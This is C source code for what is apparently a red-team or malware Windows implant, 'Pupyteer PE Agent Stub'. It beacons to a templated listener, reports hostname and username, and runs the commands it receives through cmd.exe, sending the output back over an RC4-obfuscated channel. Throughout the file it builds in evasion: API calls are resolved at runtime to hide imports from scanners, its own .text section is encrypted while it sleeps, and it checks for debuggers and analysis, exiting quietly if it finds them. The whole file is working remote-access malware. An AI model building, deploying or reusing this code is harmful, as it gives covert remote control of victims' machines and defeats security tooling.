/*
 * Pupyteer PE Agent Stub — Windows TCP Beacon (hardened)
 * -------------------------------------------------------
 * MinGW cross-compiled Windows agent that connects back to a Pupyteer
 * TCP listener using the JSON-line protocol, with runtime API
 * resolution, an RC4 transport layer and an in-place .text sleep mask.
 *
 * Compile:
 *   x86_64-w64-mingw32-gcc -o agent.exe agent.c -lws2_32
 *
 * ─────────────────────────────────────────────────────────────────────
 * WIRE FORMAT (authoritative — the Python listener MUST match this)
 * ─────────────────────────────────────────────────────────────────────
 * Every message is a newline-terminated JSON object that is FIRST
 * encrypted with RC4 using the build-time key AGENT_RC4KEY.
 *
 *   plaintext  = ASCII JSON object + '\n'
 *   ciphertext = RC4(key, plaintext)        # same length, no framing bytes
 *   on-wire    = ciphertext + '\n'          # plaintext '\n' is INSIDE the RC4
 *
 * The listener therefore has to:
 *   1. read bytes up to and including the trailing '\n' delimiter,
 *   2. strip that one trailing '\n',
 *   3. RC4-decrypt the remainder with the same hex key,
 *   4. parse the resulting JSON (it still ends in its own '\n').
 *
 * There is no MAC and no nonce: this is obfuscation against casual
 * inspection, not authenticated encryption.
 *
 * ─────────────────────────────────────────────────────────────────────
 * EVASION NOTES
 * ─────────────────────────────────────────────────────────────────────
 *  - No direct ws2_32/kernel32/advapi32 calls appear in the import
 *    table. Every API is resolved at runtime through
 *    LoadLibraryA/GetProcAddress, so a static IAT scan sees only the
 *    handful of loader imports needed to perform that resolution.
 *  - Command output is captured through an inheritable anonymous pipe
 *    (CreatePipe + SetHandleInformation) instead of a temp file, so no
 *    cmd.exe redirection artefact lands on disk.
 *  - Before each beacon sleep the agent's own PE .text section is
 *    RC4-encrypted in place (VirtualProtect RWX, encrypt, Sleep,
 *    decrypt, restore protection). Any failure degrades to a plain
 *    Sleep rather than crashing.
 *  - Anti-analysis checks are compiled in only when AGENT_ANTI_ANALYSIS
 *    is non-zero.
 */

#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif

#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

/* ── build-time configuration (filled by PEBuilder) ── */
#ifndef AGENT_HOST
#define AGENT_HOST "{{HOST}}"
#endif
#ifndef AGENT_PORT
#define AGENT_PORT {{PORT}}
#endif
#ifndef AGENT_SLEEP
#define AGENT_SLEEP {{SLEEP}}
#endif
#ifndef AGENT_JITTER
#define AGENT_JITTER {{JITTER}}
#endif
/* RC4 key for the transport layer, as bare hex digits (even length).
 * Default is a placeholder that PEBuilder replaces; the "deadbeef" fallback
 * only applies if the builder is bypassed. */
#ifndef AGENT_RC4KEY
#define AGENT_RC4KEY "{{RC4KEY}}"
#endif
/* 1 = enable anti-analysis gating, 0 = compile it out entirely. */
#ifndef AGENT_ANTI_ANALYSIS
#define AGENT_ANTI_ANALYSIS {{ANTI_ANALYSIS}}
#endif
#ifndef AGENT_VERSION
#define AGENT_VERSION "1.0.0"
#endif

#define RECV_BUF_SIZE 65536
#define SEND_BUF_SIZE 65536
#define MAX_CMD_OUTPUT (32 * 1024)

static char g_session_id[64] = {0};
static char g_hostname[256] = {0};
static char g_username[256] = {0};
static const char *g_agent_version = AGENT_VERSION;

/* Runtime-resolved transport key (from AGENT_RC4KEY hex at first use). */
static unsigned char g_rc4key[64];
static int g_rc4key_len = 0;
static int g_rc4key_ready = 0;

/* ── dynamically resolved API table ────────────────────────────────────
 * Every function pointer below is resolved at runtime, so the linker
 * never emits a direct IAT entry for the underlying DLL.
 */
typedef int(WSAAPI *fn_WSAStartup)(WORD, LPWSADATA);
typedef SOCKET(WSAAPI *fn_socket)(int, int, int);
typedef int(WSAAPI *fn_connect)(SOCKET, const struct sockaddr *, int);
typedef int(WSAAPI *fn_send)(SOCKET, const char *, int, int);
typedef int(WSAAPI *fn_recv)(SOCKET, char *, int, int);
typedef int(WSAAPI *fn_closesocket)(SOCKET);
typedef int(WSAAPI *fn_inet_pton)(int, const char *, void *);
typedef u_short(WSAAPI *fn_htons)(u_short);
typedef int(WSAAPI *fn_WSACleanup)(void);
typedef BOOL(WINAPI *fn_CreateProcessA)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES,
                                       LPSECURITY_ATTRIBUTES, BOOL, DWORD,
                                       LPVOID, LPCSTR, LPSTARTUPINFOA,
                                       LPPROCESS_INFORMATION);
typedef BOOL(WINAPI *fn_CreatePipe)(PHANDLE, PHANDLE,
                                    LPSECURITY_ATTRIBUTES, DWORD);
typedef BOOL(WINAPI *fn_SetHandleInformation)(HANDLE, DWORD, DWORD);
typedef BOOL(WINAPI *fn_PeekNamedPipe)(HANDLE, LPVOID, DWORD, LPDWORD,
                                       LPDWORD, LPDWORD);
typedef BOOL(WINAPI *fn_ReadFile)(HANDLE, LPVOID, DWORD, LPDWORD,
                                  LPOVERLAPPED);
typedef BOOL(WINAPI *fn_CloseHandle)(HANDLE);
typedef void(WINAPI *fn_Sleep)(DWORD);
typedef void(WINAPI *fn_ExitProcess)(UINT);
typedef DWORD(WINAPI *fn_WaitForSingleObject)(HANDLE, DWORD);
typedef DWORD(WINAPI *fn_GetLastError)(void);
typedef BOOL(WINAPI *fn_GetComputerNameA)(LPSTR, LPDWORD);
typedef BOOL(WINAPI *fn_GetUserNameA)(LPSTR, LPDWORD);
typedef DWORD(WINAPI *fn_GetTickCount)(void);
typedef DWORD(WINAPI *fn_GetCurrentProcessId)(void);
typedef BOOL(WINAPI *fn_IsDebuggerPresent)(void);
typedef LPVOID(WINAPI *fn_VirtualAlloc)(LPVOID, SIZE_T, DWORD, DWORD);
typedef BOOL(WINAPI *fn_VirtualProtect)(LPVOID, SIZE_T, DWORD, PDWORD);
typedef BOOL(WINAPI *fn_GetThreadContext)(HANDLE, LPCONTEXT);
typedef HANDLE(WINAPI *fn_GetCurrentThread)(void);
typedef BOOLEAN(APIENTRY *fn_RtlGenRandom)(PVOID, ULONG);

static fn_WSAStartup           p_WSAStartup;
static fn_socket               p_socket;
static fn_connect              p_connect;
static fn_send                 p_send;
static fn_recv                 p_recv;
static fn_closesocket          p_closesocket;
static fn_inet_pton            p_inet_pton;
static fn_htons                p_htons;
static fn_WSACleanup           p_WSACleanup;
static fn_CreateProcessA       p_CreateProcessA;
static fn_CreatePipe           p_CreatePipe;
static fn_SetHandleInformation p_SetHandleInformation;
static fn_PeekNamedPipe        p_PeekNamedPipe;
static fn_ReadFile             p_ReadFile;
static fn_CloseHandle          p_CloseHandle;
static fn_Sleep                p_Sleep;
static fn_ExitProcess          p_ExitProcess;
static fn_WaitForSingleObject  p_WaitForSingleObject;
static fn_GetLastError         p_GetLastError;
static fn_GetComputerNameA     p_GetComputerNameA;
static fn_GetUserNameA         p_GetUserNameA;
static fn_GetTickCount         p_GetTickCount;
static fn_GetCurrentProcessId  p_GetCurrentProcessId;
static fn_IsDebuggerPresent    p_IsDebuggerPresent;
static fn_VirtualAlloc         p_VirtualAlloc;
static fn_VirtualProtect       p_VirtualProtect;
static fn_GetThreadContext     p_GetThreadContext;
static fn_GetCurrentThread     p_GetCurrentThread;
static fn_RtlGenRandom         p_RtlGenRandom;

/* ── RC4 ────────────────────────────────────────────────────────────── */

static void rc4_crypt(const unsigned char *key, int keylen,
                      const unsigned char *in, unsigned char *out, size_t len) {
    unsigned char s[256];
    int i, j;
    size_t k;

    if (!key || keylen <= 0) {
        if (out != in && len) memcpy(out, in, len);
        return;
    }
    for (i = 0; i < 256; i++) s[i] = (unsigned char)i;
    j = 0;
    for (i = 0; i < 256; i++) {
        j = (j + s[i] + key[i % keylen]) & 0xFF;
        { unsigned char t = s[i]; s[i] = s[j]; s[j] = t; }
    }
    i = j = 0;
    for (k = 0; k < len; k++) {
        unsigned char t;
        i = (i + 1) & 0xFF;
        j = (j + s[i]) & 0xFF;
        t = s[i]; s[i] = s[j]; s[j] = t;
        out[k] = (unsigned char)(in[k] ^ s[(s[i] + s[j]) & 0xFF]);
    }
    /* Do not leave the RC4 state on the stack. */
    memset(s, 0, sizeof(s));
}

/* Decode the AGENT_RC4KEY hex string once into g_rc4key. */
static void init_rc4_key(void) {
    const char *hex = AGENT_RC4KEY;
    size_t hlen = strlen(hex);
    size_t n = hlen / 2;
    size_t i;

    g_rc4key_ready = 0;
    g_rc4key_len = 0;
    if (n == 0) return;
    if (n > sizeof(g_rc4key)) n = sizeof(g_rc4key);
    for (i = 0; i < n; i++) {
        char c;
        int v = 0;
        int ok = 0;

        c = hex[i * 2];
        if (c >= '0' && c <= '9') { v = (c - '0') << 4; ok = 1; }
        else if (c >= 'a' && c <= 'f') { v = (c - 'a' + 10) << 4; ok = 1; }
        else if (c >= 'A' && c <= 'F') { v = (c - 'A' + 10) << 4; ok = 1; }
        if (!ok) return;
        c = hex[i * 2 + 1];
        if (c >= '0' && c <= '9') { v |= c - '0'; ok = 1; }
        else if (c >= 'a' && c <= 'f') { v |= c - 'a' + 10; ok = 1; }
        else if (c >= 'A' && c <= 'F') { v |= c - 'A' + 10; ok = 1; }
        if (!ok) return;
        g_rc4key[i] = (unsigned char)v;
    }
    g_rc4key_len = (int)n;
    g_rc4key_ready = 1;
}

/* ── anti-analysis ──────────────────────────────────────────────────── */

/* Minimal PEB definition: winnt.h does not export PPEB on MinGW. Offsets
 * below are for x64 (0x02 = BeingDebugged, 0x0BC = NtGlobalFlag). */
typedef struct _PUP_PEB {
    BYTE Reserved1[2];
    BYTE BeingDebugged;
    BYTE Reserved2[1];
    PVOID Reserved3[4];
} PUP_PEB;

#define PUP_PEB_ADDRESS ((PUP_PEB *)__readgsqword(0x60))
#define PUP_NTGLOBALFLAG_OFFSET 0xBC
#define PUP_NTGLOBALFLAG_DEBUG 0x70

#if AGENT_ANTI_ANALYSIS

/* True when the process looks like it is being analysed. */
static int detect_analysis(void) {
    DWORD t0, t1;
    CONTEXT ctx;
    PUP_PEB *pPeb;

    /* 1. PEB->BeingDebugged */
    pPeb = PUP_PEB_ADDRESS;
    if (pPeb && pPeb->BeingDebugged) return 1;

    /* 2. PEB->NtGlobalFlag: 0x70 set by the loader under a debugger. */
    if (pPeb && (*(DWORD *)((BYTE *)pPeb + PUP_NTGLOBALFLAG_OFFSET) &
                 PUP_NTGLOBALFLAG_DEBUG)) return 1;

    /* 3. IsDebuggerPresent */
    if (p_IsDebuggerPresent && p_IsDebuggerPresent()) return 1;

    /* 4. Hardware breakpoints in DR0-DR3. */
    memset(&ctx, 0, sizeof(ctx));
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    if (p_GetThreadContext && p_GetCurrentThread &&
        p_GetThreadContext(p_GetCurrentThread(), &ctx)) {
        if (ctx.Dr0 || ctx.Dr1 || ctx.Dr2 || ctx.Dr3) return 1;
    }

    /* 5. Timing: a debugger inflates the wall clock of a short Sleep. */
    t0 = p_GetTickCount ? p_GetTickCount() : 0;
    p_Sleep(2000);
    t1 = p_GetTickCount ? p_GetTickCount() : 0;
    if (t1 < t0) return 0;            /* tick wrap */
    if ((t1 - t0) > 3000) return 1;   /* slept ~2s but lost >1s */

    return 0;
}

/* Exit quietly if any anti-analysis check trips. */
static void anti_analysis_gate(void) {
    if (detect_analysis()) {
        memset(g_rc4key, 0, sizeof(g_rc4key));
        if (p_ExitProcess) p_ExitProcess(0);
        else ExitProcess(0);
    }
}

#define AA_GATE() anti_analysis_gate()

#else /* !AGENT_ANTI_ANALYSIS */

/* Compiled out, but referenced from AA_GATE() call sites, so mark it unused
 * to keep -Wall -Wextra clean when the gate is disabled. */
__attribute__((unused))
static void anti_analysis_gate(void) { /* compiled out */ }
#define AA_GATE() ((void)0)

#endif /* AGENT_ANTI_ANALYSIS */

/* ── sleep mask (encrypt own .text across the sleep) ─────────────────── */

typedef struct {
    BYTE *text;
    SIZE_T size;
    DWORD old_prot;
    int active;
} text_mask_t;

static void mask_text_begin(text_mask_t *m) {
    BYTE *base;
    IMAGE_DOS_HEADER *dos;
    IMAGE_NT_HEADERS *nt;
    IMAGE_SECTION_HEADER *sec;
    DWORD old = 0;
    WORD i, n;

    memset(m, 0, sizeof(*m));

    base = (BYTE *)GetModuleHandleA(NULL);
    if (!base) return;
    dos = (IMAGE_DOS_HEADER *)base;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return;
    nt = (IMAGE_NT_HEADERS *)(base + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return;

    sec = IMAGE_FIRST_SECTION(nt);
    n = nt->FileHeader.NumberOfSections;
    for (i = 0; i < n; i++) {
        if (memcmp(sec[i].Name, ".text", 5) == 0) {
            BYTE *text = base + sec[i].VirtualAddress;
            SIZE_T size = sec[i].Misc.VirtualSize;

            if (!text || size == 0) return;
            if (!g_rc4key_ready) init_rc4_key();
            if (!p_VirtualProtect(text, size, PAGE_EXECUTE_READWRITE, &old))
                return;

            m->text = text;
            m->size = size;
            m->old_prot = old;
            m->active = 1;
            rc4_crypt(g_rc4key, g_rc4key_len, text, text, size);
            return;
        }
    }
}

static void mask_text_end(text_mask_t *m) {
    DWORD old = 0;

    if (!m->active) return;
    rc4_crypt(g_rc4key, g_rc4key_len, m->text, m->text, m->size);
    if (!p_VirtualProtect(m->text, m->size, m->old_prot, &old)) {
        /* Restore failed; nothing further we can safely do. */
    }
    memset(m, 0, sizeof(*m));
}

/* Sleep for base_seconds * (1 +/- jitter_pct/100), masking .text. */
static void jittered_sleep(int base_seconds, int jitter_pct) {
    text_mask_t mask;
    double total;

    if (jitter_pct <= 0) {
        total = (double)base_seconds;
    } else {
        double delta = (double)base_seconds * (jitter_pct / 100.0);
        double offset = ((double)rand() / RAND_MAX * 2.0 - 1.0) * delta;
        total = (double)base_seconds + offset;
        if (total < 1.0) total = 1.0;
    }

    if (!p_Sleep) return;

    mask_text_begin(&mask);
    p_Sleep((DWORD)(total * 1000));
    mask_text_end(&mask);          /* best-effort restore, never crashes */
}

/* ── secure scrubbing ───────────────────────────────────────────────── */

static void secure_scrub(void *buf, size_t len) {
    unsigned char *p = (unsigned char *)buf;
    size_t i, pass;

    if (!p || len == 0) return;
    /* Overwrite with random, then zero — used by both stubs' helpers. */
    for (pass = 0; pass < 2; pass++) {
        for (i = 0; i < len; i++) p[i] = (unsigned char)(rand() & 0xFF);
    }
    memset(p, 0, len);
}

/* ── helpers ── */

static void get_hostname(void) {
    DWORD sz = sizeof(g_hostname);
    if (!p_GetComputerNameA(g_hostname, &sz)) {
        strncpy_s(g_hostname, sizeof(g_hostname), "unknown", _TRUNCATE);
    }
}

static void get_username(void) {
    DWORD sz = sizeof(g_username);
    if (!p_GetUserNameA(g_username, &sz)) {
        strncpy_s(g_username, sizeof(g_username), "unknown", _TRUNCATE);
    }
}

/* ── socket I/O (RC4-framed) ── */

static int sock_send(SOCKET s, const char *data) {
    unsigned char buf[SEND_BUF_SIZE];
    size_t len = strlen(data);
    size_t sent = 0;

    if (!p_send) return -1;
    if (len + 1 > sizeof(buf)) return -1;
    if (!g_rc4key_ready) init_rc4_key();

    /* plaintext = JSON + '\n'; ciphertext is the same length. */
    rc4_crypt(g_rc4key, g_rc4key_len, (const unsigned char *)data, buf, len);
    buf[len] = (unsigned char)'\n';
    len += 1;

    while (sent < len) {
        int n = p_send(s, (const char *)buf + sent, (int)(len - sent), 0);
        if (n <= 0) return -1;
        sent += (size_t)n;
    }
    return 0;
}

static int sock_readline(SOCKET s, char *buf, int len) {
    int total = 0;
    char c;

    if (!p_recv) return -1;
    while (total < len - 1) {
        int n = p_recv(s, &c, 1, 0);
        if (n <= 0) return -1;
        if (c == '\n') break;
        if (c == '\r') continue;
        buf[total++] = c;
    }
    buf[total] = '\0';

    /* Decrypt in place: the wire frame carried no framing bytes. */
    if (total > 0) {
        unsigned char tmp[RECV_BUF_SIZE];
        if (!g_rc4key_ready) init_rc4_key();
        if (total > (int)sizeof(tmp)) total = (int)sizeof(tmp);
        rc4_crypt(g_rc4key, g_rc4key_len, (const unsigned char *)buf, tmp,
                  (size_t)total);
        memcpy(buf, tmp, (size_t)total);
        buf[total] = '\0';
        secure_scrub(tmp, sizeof(tmp));
    }
    return total;
}

/* ── JSON helpers ── */

static const char *json_get_string(const char *json, const char *key, char *out, size_t out_sz) {
    char pattern[128];
    snprintf(pattern, sizeof(pattern), "\"%s\"", key);
    const char *p = strstr(json, pattern);
    if (!p) { out[0] = '\0'; return NULL; }
    p += strlen(pattern);
    while (*p && (*p == ' ' || *p == '\t' || *p == ':' || *p == ',')) p++;
    if (*p != '"') { out[0] = '\0'; return NULL; }
    p++;
    size_t i = 0;
    while (*p && *p != '"' && i < out_sz - 1) {
        if (*p == '\\' && p[1]) {
            p++;
            switch (*p) {
                case 'n': out[i++] = '\n'; break;
                case 'r': out[i++] = '\r'; break;
                case 't': out[i++] = '\t'; break;
                case '"': out[i++] = '"'; break;
                case '\\': out[i++] = '\\'; break;
                default:  out[i++] = *p; break;
            }
        } else {
            out[i++] = *p;
        }
        p++;
    }
    out[i] = '\0';
    return out;
}

static void json_escape(const char *src, char *dst, size_t dst_sz) {
    size_t j = 0;
    while (*src && j < dst_sz - 2) {
        switch (*src) {
            case '"':  dst[j++] = '\\'; dst[j++] = '"'; break;
            case '\\': dst[j++] = '\\'; dst[j++] = '\\'; break;
            case '\n': dst[j++] = '\\'; dst[j++] = 'n'; break;
            case '\r': dst[j++] = '\\'; dst[j++] = 'r'; break;
            case '\t': dst[j++] = '\\'; dst[j++] = 't'; break;
            default:   dst[j++] = *src; break;
        }
        src++;
    }
    dst[j] = '\0';
}

/* ── command execution (in-line pipe capture, no temp file) ─────────── */

static void exec_command(const char *cmd, char *out, size_t out_sz) {
    char cmdline[4096];
    HANDLE rd = NULL, wr = NULL;
    SECURITY_ATTRIBUTES sa;
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    int exit_code = -1;

    out[0] = '\0';
    if (!p_CreateProcessA || !p_CreatePipe || !p_SetHandleInformation ||
        !p_PeekNamedPipe || !p_ReadFile || !p_CloseHandle) {
        snprintf(out, out_sz, "command execution unavailable");
        return;
    }

    memset(&sa, 0, sizeof(sa));
    sa.nLength = sizeof(sa);
    sa.bInheritHandle = TRUE;
    sa.lpSecurityDescriptor = NULL;

    if (!p_CreatePipe(&rd, &wr, &sa, 0)) {
        snprintf(out, out_sz, "pipe creation failed");
        return;
    }
    /* The read end must stay private to this process. */
    if (!p_SetHandleInformation(rd, HANDLE_FLAG_INHERIT, 0)) {
        p_CloseHandle(rd);
        p_CloseHandle(wr);
        snprintf(out, out_sz, "pipe setup failed");
        return;
    }

    memset(&si, 0, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdInput = GetStdHandle(STD_INPUT_HANDLE);
    si.hStdOutput = wr;
    si.hStdError = wr;

    snprintf(cmdline, sizeof(cmdline), "cmd.exe /c %s", cmd);

    memset(&pi, 0, sizeof(pi));
    if (!p_CreateProcessA(NULL, cmdline, NULL, NULL, TRUE, 0, NULL, NULL,
                          &si, &pi)) {
        DWORD err = p_GetLastError ? p_GetLastError() : 0;
        p_CloseHandle(rd);
        p_CloseHandle(wr);
        snprintf(out, out_sz, "process creation failed (err=%lu)",
                 (unsigned long)err);
        return;
    }

    /* Parent must not hold the write end or ReadFile would never EOF. */
    p_CloseHandle(wr);
    wr = NULL;

    {
        size_t total = 0;
        DWORD got = 0;
        while (total < out_sz - 1) {
            DWORD avail = 0;
            if (!p_PeekNamedPipe(rd, NULL, 0, NULL, &avail, NULL)) break;
            if (avail == 0) {
                if (p_WaitForSingleObject &&
                    p_WaitForSingleObject(pi.hProcess, 50) == WAIT_OBJECT_0)
                    break;
                continue;
            }
            if (avail > (DWORD)(out_sz - 1 - total))
                avail = (DWORD)(out_sz - 1 - total);
            if (!p_ReadFile(rd, out + total, avail, &got, NULL) || got == 0)
                break;
            total += got;
        }
        out[total] = '\0';
    }

    if (p_WaitForSingleObject) p_WaitForSingleObject(pi.hProcess, 10000);
    {
        DWORD ec = 0;
        if (GetExitCodeProcess(pi.hProcess, &ec)) exit_code = (int)ec;
    }

    p_CloseHandle(pi.hThread);
    p_CloseHandle(pi.hProcess);
    p_CloseHandle(rd);
    rd = NULL;

    if (out[0] == '\0' && exit_code != 0) {
        snprintf(out, out_sz, "command failed with exit code %d", exit_code);
    } else if (exit_code != 0) {
        char note[96];
        size_t cur = strlen(out);
        snprintf(note, sizeof(note), "\n[exit code %d]", exit_code);
        if (cur + strlen(note) < out_sz - 1) {
            memcpy(out + cur, note, strlen(note) + 1);
        }
    }
}

/* ── protocol handlers ── */

static int handle_register(SOCKET s) {
    char escaped_host[512], escaped_user[512];
    char msg[SEND_BUF_SIZE];
    json_escape(g_hostname, escaped_host, sizeof(escaped_host));
    json_escape(g_username, escaped_user, sizeof(escaped_user));
    snprintf(msg, sizeof(msg),
             "{\"type\":\"register\",\"hostname\":\"%s\",\"os\":\"windows\","
             "\"arch\":\"x64\",\"username\":\"%s\",\"agent_version\":\"%s\"}",
             escaped_host, escaped_user, g_agent_version);
    return sock_send(s, msg);
}

static int handle_server_msg(SOCKET s, const char *line) {
    char msg_type[32] = {0};
    json_get_string(line, "type", msg_type, sizeof(msg_type));

    if (strcmp(msg_type, "registered") == 0) {
        char sid[64] = {0};
        json_get_string(line, "session_id", sid, sizeof(sid));
        if (sid[0]) {
            strncpy_s(g_session_id, sizeof(g_session_id), sid, _TRUNCATE);
        }
        return 0;
    }

    if (strcmp(msg_type, "ack") == 0) return 0;
    if (strcmp(msg_type, "error") == 0) return -1;

    if (strcmp(msg_type, "commands") == 0) {
        const char *arr_start = strstr(line, "\"commands\"");
        if (!arr_start) return 0;
        arr_start = strchr(arr_start, '[');
        if (!arr_start) return 0;

        const char *p = arr_start + 1;
        while (*p) {
            while (*p && *p != '{') {
                if (*p == ']') return 0;
                p++;
            }
            if (!*p) break;

            const char *obj_start = p;
            int depth = 0;
            const char *obj_end = p;
            while (*obj_end) {
                if (*obj_end == '{') depth++;
                else if (*obj_end == '}') { depth--; if (depth == 0) { obj_end++; break; } }
                obj_end++;
            }
            size_t obj_len = (size_t)(obj_end - obj_start);
            char obj[2048];
            if (obj_len >= sizeof(obj)) obj_len = sizeof(obj) - 1;
            memcpy(obj, obj_start, obj_len);
            obj[obj_len] = '\0';

            char cmd_id[64] = {0};
            char cmd[1024] = {0};
            json_get_string(obj, "command_id", cmd_id, sizeof(cmd_id));
            json_get_string(obj, "command", cmd, sizeof(cmd));

            if (cmd[0]) {
                char output[MAX_CMD_OUTPUT];
                char escaped_out[MAX_CMD_OUTPUT];
                exec_command(cmd, output, sizeof(output));
                json_escape(output, escaped_out, sizeof(escaped_out));

                char out_msg[SEND_BUF_SIZE];
                snprintf(out_msg, sizeof(out_msg),
                         "{\"type\":\"output\",\"session_id\":\"%s\","
                         "\"command_id\":\"%s\",\"output\":\"%s\"}",
                         g_session_id, cmd_id, escaped_out);
                if (sock_send(s, out_msg) != 0) return -1;

                /* Do not leave captured output on the stack. */
                secure_scrub(output, sizeof(output));
                secure_scrub(escaped_out, sizeof(escaped_out));
            }
            p = obj_end;
        }
        return 0;
    }

    return 0;
}

/* ── runtime API resolution ─────────────────────────────────────────── */

static HMODULE resolve_module(const char *name) {
    HMODULE h = GetModuleHandleA(name);
    if (h) return h;
    return LoadLibraryA(name);
}

#define RESOLVE(mod, type, name, var)                                  \
    do {                                                               \
        /* GetProcAddress returns FARPROC (generic, untyped); the      \
         * cast to the concrete signature is the standard dynamic     \
         * resolution idiom and is intentionally suppressed. */        \
        _Pragma("GCC diagnostic push")                                 \
        _Pragma("GCC diagnostic ignored \"-Wcast-function-type\"")     \
        var = (type)(void *)GetProcAddress(mod, name);                 \
        _Pragma("GCC diagnostic pop")                                  \
        if (!var) return 0;                                            \
    } while (0)

static int resolve_apis(void) {
    HMODULE hWs, hK32, hAdv;

    hWs = resolve_module("ws2_32.dll");
    if (!hWs) return 0;
    hK32 = resolve_module("kernel32.dll");
    if (!hK32) return 0;
    hAdv = resolve_module("advapi32.dll");
    if (!hAdv) return 0;

    RESOLVE(hWs, fn_WSAStartup, "WSAStartup", p_WSAStartup);
    RESOLVE(hWs, fn_socket, "socket", p_socket);
    RESOLVE(hWs, fn_connect, "connect", p_connect);
    RESOLVE(hWs, fn_send, "send", p_send);
    RESOLVE(hWs, fn_recv, "recv", p_recv);
    RESOLVE(hWs, fn_closesocket, "closesocket", p_closesocket);
    RESOLVE(hWs, fn_inet_pton, "inet_pton", p_inet_pton);
    RESOLVE(hWs, fn_htons, "htons", p_htons);
    RESOLVE(hWs, fn_WSACleanup, "WSACleanup", p_WSACleanup);

    RESOLVE(hK32, fn_CreateProcessA, "CreateProcessA", p_CreateProcessA);
    RESOLVE(hK32, fn_CreatePipe, "CreatePipe", p_CreatePipe);
    RESOLVE(hK32, fn_SetHandleInformation, "SetHandleInformation",
            p_SetHandleInformation);
    RESOLVE(hK32, fn_PeekNamedPipe, "PeekNamedPipe", p_PeekNamedPipe);
    RESOLVE(hK32, fn_ReadFile, "ReadFile", p_ReadFile);
    RESOLVE(hK32, fn_CloseHandle, "CloseHandle", p_CloseHandle);
    RESOLVE(hK32, fn_Sleep, "Sleep", p_Sleep);
    RESOLVE(hK32, fn_ExitProcess, "ExitProcess", p_ExitProcess);
    RESOLVE(hK32, fn_WaitForSingleObject, "WaitForSingleObject",
            p_WaitForSingleObject);
    RESOLVE(hK32, fn_GetLastError, "GetLastError", p_GetLastError);
    RESOLVE(hK32, fn_GetComputerNameA, "GetComputerNameA", p_GetComputerNameA);
    RESOLVE(hK32, fn_GetUserNameA, "GetUserNameA", p_GetUserNameA);
    RESOLVE(hK32, fn_GetTickCount, "GetTickCount", p_GetTickCount);
    RESOLVE(hK32, fn_GetCurrentProcessId, "GetCurrentProcessId",
            p_GetCurrentProcessId);
    RESOLVE(hK32, fn_IsDebuggerPresent, "IsDebuggerPresent",
            p_IsDebuggerPresent);
    RESOLVE(hK32, fn_VirtualAlloc, "VirtualAlloc", p_VirtualAlloc);
    RESOLVE(hK32, fn_VirtualProtect, "VirtualProtect", p_VirtualProtect);
    RESOLVE(hK32, fn_GetThreadContext, "GetThreadContext", p_GetThreadContext);
    RESOLVE(hK32, fn_GetCurrentThread, "GetCurrentThread", p_GetCurrentThread);

    /* SystemFunction036 is the undocumented alias of RtlGenRandom. */
    RESOLVE(hAdv, fn_RtlGenRandom, "SystemFunction036", p_RtlGenRandom);

    return 1;
}

/* ── main ── */

int main(void) {
    WSADATA wsa;

    srand((unsigned int)time(NULL) ^ p_GetCurrentProcessId());

    if (!resolve_apis()) {
        return 1;
    }
    init_rc4_key();

    if (p_WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
        return 1;
    }

    AA_GATE();

    get_hostname();
    get_username();

    while (1) {
        SOCKET s;
        struct sockaddr_in addr;

        s = p_socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (s == INVALID_SOCKET) {
            jittered_sleep(AGENT_SLEEP, AGENT_JITTER);
            continue;
        }

        memset(&addr, 0, sizeof(addr));
        addr.sin_family = AF_INET;
        addr.sin_port = p_htons ? p_htons((u_short)AGENT_PORT) : 0;
        if (p_inet_pton) p_inet_pton(AF_INET, AGENT_HOST, &addr.sin_addr);
        else memset(&addr.sin_addr, 0, sizeof(addr.sin_addr));

        if (p_connect(s, (struct sockaddr *)&addr, sizeof(addr)) != 0) {
            p_closesocket(s);
            jittered_sleep(AGENT_SLEEP, AGENT_JITTER);
            continue;
        }

        g_session_id[0] = '\0';
        if (handle_register(s) != 0) {
            p_closesocket(s);
            jittered_sleep(AGENT_SLEEP, AGENT_JITTER);
            continue;
        }

        char line[RECV_BUF_SIZE];
        if (sock_readline(s, line, sizeof(line)) <= 0) {
            p_closesocket(s);
            jittered_sleep(AGENT_SLEEP, AGENT_JITTER);
            continue;
        }
        if (handle_server_msg(s, line) != 0) {
            p_closesocket(s);
            jittered_sleep(AGENT_SLEEP, AGENT_JITTER);
            continue;
        }

        while (1) {
            char checkin[SEND_BUF_SIZE];
            snprintf(checkin, sizeof(checkin),
                     "{\"type\":\"checkin\",\"session_id\":\"%s\"}", g_session_id);
            if (sock_send(s, checkin) != 0) break;

            if (sock_readline(s, line, sizeof(line)) <= 0) break;
            if (handle_server_msg(s, line) != 0) break;

            AA_GATE();
            jittered_sleep(AGENT_SLEEP, AGENT_JITTER);
        }

        p_closesocket(s);
        jittered_sleep(AGENT_SLEEP, AGENT_JITTER);
    }

    p_WSACleanup();
    return 0;
}
